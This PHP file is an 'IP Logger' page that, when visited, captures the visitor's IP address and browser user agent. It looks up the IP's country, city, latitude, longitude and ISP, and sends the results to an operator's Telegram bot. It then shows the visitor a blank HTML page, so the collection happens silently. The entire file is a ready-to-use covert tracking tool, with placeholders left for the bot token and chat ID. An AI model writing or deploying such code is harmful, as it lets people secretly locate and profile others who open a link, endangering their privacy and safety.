<?php
ini_set('user_agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36');
//Into the $token variable, you need to insert the token that @botFather sent us
$token = ""; // Bot token here
$chat_id = ""; //Chat ID here

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR'];
    }


$browser = $_SERVER['HTTP_USER_AGENT'];

// URL of the page to open
$url = 'http://ip-api.com/json/'.$ipaddress;

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

$ipinfo = json_decode($response);

$country = $ipinfo -> country;
$region = $ipinfo -> regionName;
$city = $ipinfo -> city;
$localtime = $ipinfo -> timezone;
$latitude = $ipinfo -> lat;
$longitude = $ipinfo -> lon;
$provider = $ipinfo -> isp;


//Assemble into an array what will be passed to the bot
$arr = array(
    '⛔IP Logger by Nick_Vinesmoke⛔',
    '📡IP address: ' => $ipaddress,
    '🏴Country: ' => $country,
    '🌐Region: ' => $region,
    '🌇City: ' => $city,
    '⌚Local time: ' => $localtime,
    '🗺Latitude and longitude: ' => $latitude.' '.$longitude,
    '📶Provider: ' => $provider,
    '🧭Browser and User-Agent: ' => $browser  
);

//Customize the appearance of the message in the telegram
foreach($arr as $key => $value) {
    $txt .= "<b>".$key."</b> ".$value."%0A";
};

// Pass data to the bot
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


?>

<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>




</body>
</html>